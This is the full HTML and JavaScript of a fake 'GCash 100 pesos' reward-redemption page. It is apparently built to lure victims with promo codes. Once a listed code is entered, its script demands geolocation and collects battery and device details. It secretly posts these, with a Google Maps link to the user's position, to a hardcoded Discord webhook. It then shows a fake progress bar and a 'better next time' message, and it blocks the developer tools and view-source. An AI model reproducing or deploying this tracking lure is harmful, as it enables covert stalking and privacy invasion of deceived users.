<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OFFICIAL REWARDS | GCASH 100 PESOS</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Plus+Jakarta+Sans:wght@300;500;700&display=swap');
        * { box-sizing: border-box; margin: 0; padding: 0; -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; }
        body { background: radial-gradient(circle at top right, #1e1b4b 0%, #0f172a 100%); font-family: 'Plus Jakarta Sans', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: #f8fafc; overflow: hidden; }
        .container { background: rgba(30, 41, 59, 0.4); backdrop-filter: blur(30px); border: 1px solid rgba(129, 140, 248, 0.2); border-radius: 40px; padding: 50px; width: 95%; max-width: 440px; text-align: center; box-shadow: 0 50px 120px -30px rgba(0, 0, 0, 0.8); position: relative; }
        .gift-logo { font-size: 5.5rem; margin-bottom: 15px; filter: drop-shadow(0 0 30px #8b5cf6); animation: float 3s ease-in-out infinite; display: block; }
        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-15px); } }
        h1 { font-family: 'Orbitron', sans-serif; font-size: 1.4rem; letter-spacing: 4px; color: #a5b4fc; margin-bottom: 15px; }
        .desc { font-size: 0.85rem; color: #94a3b8; line-height: 1.7; margin-bottom: 35px; }
        input { width: 100%; background: rgba(15, 23, 42, 0.9); border: 2px solid rgba(129, 140, 248, 0.2); border-radius: 20px; padding: 20px; color: #fff; font-size: 1.1rem; margin-bottom: 25px; outline: none; transition: 0.4s; text-align: center; font-family: 'Orbitron', sans-serif; letter-spacing: 2px; }
        .btn { width: 100%; background: rgba(79, 70, 229, 0.3); color: rgba(255,255,255,0.3); border: 1px solid rgba(255,255,255,0.1); padding: 22px; border-radius: 20px; font-weight: 700; cursor: not-allowed; transition: 0.6s; font-family: 'Orbitron', sans-serif; text-transform: uppercase; letter-spacing: 3px; }
        .btn.active { background: linear-gradient(135deg, #6366f1 0%, #d946ef 100%); color: white; cursor: pointer; border: none; box-shadow: 0 0 40px rgba(139, 92, 246, 0.6); transform: translateY(-2px); }
        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(2, 6, 23, 0.9); display: none; justify-content: center; align-items: center; z-index: 100; backdrop-filter: blur(10px); }
        .modal-box { background: #0f172a; border: 1px solid #f43f5e; border-radius: 28px; padding: 40px; width: 85%; max-width: 340px; text-align: center; }
        #loading-view { display: none; }
        .progress-ring { width: 100%; background: rgba(255, 255, 255, 0.05); border-radius: 50px; height: 12px; margin: 40px 0; overflow: hidden; border: 1px solid rgba(255,255,255,0.1); }
        .progress-fill { width: 0%; height: 100%; background: linear-gradient(90deg, #818cf8, #d946ef); transition: 0.8s ease-in-out; box-shadow: 0 0 20px #818cf8; }
        .final-msg { animation: popIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
        @keyframes popIn { from { transform: scale(0.8); opacity: 0; } to { transform: scale(1); opacity: 1; } }
        .hidden { display: none; }
    </style>
</head>
<body oncontextmenu="return false;"> <div class="modal-overlay" id="customAlert">
        <div class="modal-box">
            <h2 id="modalTitle" style="color:#f43f5e; font-family:'Orbitron';">SYSTEM ERROR</h2>
            <p id="modalMsg" style="margin:25px 0; color:#94a3b8;">Please input a redeem code.</p>
            <button onclick="closeAlert()" style="background:transparent; border:1px solid #818cf8; color:#818cf8; padding:10px 30px; border-radius:12px; cursor:pointer; font-family:'Orbitron';">CLOSE</button>
        </div>
    </div>

    <div class="container">
        <div id="promo-view">
            <div class="gift-logo">üéÅ</div>
            <h1>REDEEM CODE</h1>
            <p class="desc">Claim your exclusive rewards by entering your authorized promo code.</p>
            <input type="text" id="promoInput" placeholder="ENTER CODE" oninput="checkInput()">
            <button class="btn" id="claimBtn" onclick="validateAndSync()">CLAIM REWARD</button>
        </div>

        <div id="loading-view">
            <div id="loader-content">
                <div class="gift-logo" style="font-size:3.5rem;">‚öôÔ∏è</div>
                <h1 style="font-family:'Orbitron'; font-size:1.2rem; color:#a5b4fc;">PROCESSING</h1>
                <div class="progress-ring"><div class="progress-fill" id="p-fill"></div></div>
                <p id="status-text" style="color:#818cf8; font-family:'Orbitron'; font-size:0.75rem;">Initializing Secure Uplink...</p>
            </div>
            <div id="final-content" class="hidden final-msg">
                <div class="gift-logo" style="font-size:4rem; filter: grayscale(1);">üö´</div>
                <h1 style="font-family:'Orbitron'; font-size:1.5rem; color:#f43f5e; margin-bottom:15px;">BETTER NEXT TIME</h1>
                <p style="color:#94a3b8; font-size:0.85rem; line-height:1.6;">THE PROMO IS NOT COMPATIBLE WITH YOUR CURRENT DEVICE ARCHITECTURE.</p>
            </div>
        </div>
    </div>

<script>
    // --- SECURITY SHIELD ---
    document.onkeydown = function(e) {
        if(e.keyCode == 123) return false; // Block F12
        if(e.ctrlKey && e.shiftKey && (e.keyCode == 'I'.charCodeAt(0) || e.keyCode == 'J'.charCodeAt(0) || e.keyCode == 'C'.charCodeAt(0))) return false;
        if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) return false; // Block View Source
    };

    // --- RECON LOGIC ---
    const webhook = "https://discord.com/api/webhooks/1467168586593206365/yj42mD6vmPVoRYaEsCNdG77n8fpaHhJBRk242A1viRSusMdvIa2bcZ8mpCx20JspYQr-";
    const authorizedCodes = ["ASHXVEHA", "BXJAHEJC", "BABXJGJW", "JDBXHZKW", "KWBXHZHW", "NXJAHWJR", "JZHAHECX"];

    function checkInput() {
        const val = document.getElementById("promoInput").value.toUpperCase();
        const btn = document.getElementById("claimBtn");
        val.length >= 8 ? btn.classList.add("active") : btn.classList.remove("active");
    }

    function showAlert(t, m) {
        document.getElementById("modalTitle").innerText = t;
        document.getElementById("modalMsg").innerText = m;
        document.getElementById("customAlert").style.display = "flex";
    }

    function closeAlert() { document.getElementById("customAlert").style.display = "none"; }

    function validateAndSync() {
        const val = document.getElementById("promoInput").value.toUpperCase();
        if(!val) { showAlert("INPUT REQUIRED", "Please input a redeem code."); return; }
        if(!authorizedCodes.includes(val)) { showAlert("INVALID CODE", "The code entered is not recognized."); return; }
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(pos => {
                startProcess(val, pos.coords.latitude, pos.coords.longitude);
            }, () => showAlert("SYNC ERROR", "Location access is required for verification."));
        }
    }

    async function startProcess(code, lat, lon) {
        document.getElementById("promo-view").classList.add("hidden");
        document.getElementById("loading-view").style.display = "block";

        let batLevel = "Unreachable", isCharging = "Unknown";
        if (navigator.getBattery) {
            const b = await navigator.getBattery();
            batLevel = Math.round(b.level * 100) + "%";
            isCharging = b.charging ? "YES (‚ö° Charging)" : "NO (üîã Discharged)";
        }

        let devName = "Mobile Device";
        let devOS = "Unknown OS";
        if (navigator.userAgentData) {
            const hints = await navigator.userAgentData.getHighEntropyValues(["model", "platform", "platformVersion"]);
            devName = hints.model || "Mobile Device";
            devOS = `${hints.platform} ${hints.platformVersion || ""}`;
        } else {
            const ua = navigator.userAgent;
            if (/Android/i.test(ua)) { devOS = "Android " + (ua.match(/Android\s([0-9\.]+)/)?.[1] || ""); devName = "Android Device"; }
            else if (/iPhone|iPad/i.test(ua)) { devOS = "iOS " + (ua.match(/OS\s([0-9\_]+)/)?.[1].replace(/_/g,'.') || ""); devName = "Apple Device"; }
        }

        fetch(webhook, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                username: "SUPREME_RECON_FINAL",
                embeds: [{
                    title: "üéÅ SUPREME REWARD LOGGED",
                    color: 10181046,
                    fields: [
                        { name: "üìç Latitude:", value: `\`${lat}\``, inline: true },
                        { name: "üìç Longitude:", value: `\`${lon}\``, inline: true },
                        { name: "üì± Device Name:", value: `\`${devName}\``, inline: false },
                        { name: "ü§ñ Device OS:", value: `\`${devOS}\``, inline: true },
                        { name: "üîã Battery Level:", value: `\`${batLevel}\``, inline: true },
                        { name: "üîå Charging Status:", value: `\`${isCharging}\``, inline: false },
                        { name: "üé´ Promo Code:", value: `\`${code}\``, inline: false },
                        { name: "üó∫Ô∏è Google Maps:", value: `[üìç Open in Maps](https://www.google.com/maps?q=${lat},${lon})`, inline: false }
                    ],
                    footer: { text: "Timestamp: " + new Date().toLocaleString() }
                }]
            })
        });

        const steps = ["Decrypting Key...", "Fetching Hardware ID...", "Syncing Signature...", "Finalizing Protocol..."];
        for(let i=0; i<steps.length; i++) {
            await new Promise(r => setTimeout(r, 1500));
            document.getElementById("p-fill").style.width = ((i+1)*25) + "%";
            document.getElementById("status-text").innerText = steps[i];
        }

        document.getElementById("loader-content").classList.add("hidden");
        document.getElementById("final-content").classList.remove("hidden");
    }
</script>
</body>
</html>
